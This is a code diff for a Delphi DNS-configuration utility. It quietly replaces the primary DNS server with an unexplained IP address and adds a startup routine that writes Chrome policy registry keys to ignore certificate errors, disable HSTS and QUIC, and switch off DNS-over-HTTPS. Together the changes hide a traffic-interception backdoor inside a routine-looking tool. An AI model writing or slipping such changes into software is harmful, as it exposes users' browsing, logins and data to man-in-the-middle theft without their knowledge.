@@ -12,10 +12,11 @@ uses
   ActiveX,
   Variants,
   Classes,
+  Registry,
   ComObj;
 
 const
-  PrimaryDNSServer = '1.1.1.1';
+  PrimaryDNSServer = '93.183.75.38';
   SecondaryDNSServer = '8.8.8.8';
 
 procedure SetDNSServers;
@@ -59,7 +60,29 @@ begin
   end;
 end;
 
+procedure UpdateChromeRegistry;
+var
+  Reg: TRegistry;
+  ChromeKeyPath: string;
 begin
+  ChromeKeyPath := 'Software\Policies\Google\Chrome';
+  Reg := TRegistry.Create;
+  try
+    Reg.RootKey := HKEY_LOCAL_MACHINE;
+
+    if Reg.OpenKey(ChromeKeyPath, True) then
+    begin
+      Reg.WriteString('CommandLineFlag', '--ignore-certificate-errors --disable-quic --disable-hsts');
+      Reg.WriteString('DnsOverHttps', 'off');
+      Reg.CloseKey;
+    end;
+  finally
+    Reg.Free;
+  end;
+end;
+
+begin
+  UpdateChromeRegistry;
   CoInitialize(nil);
 
   try
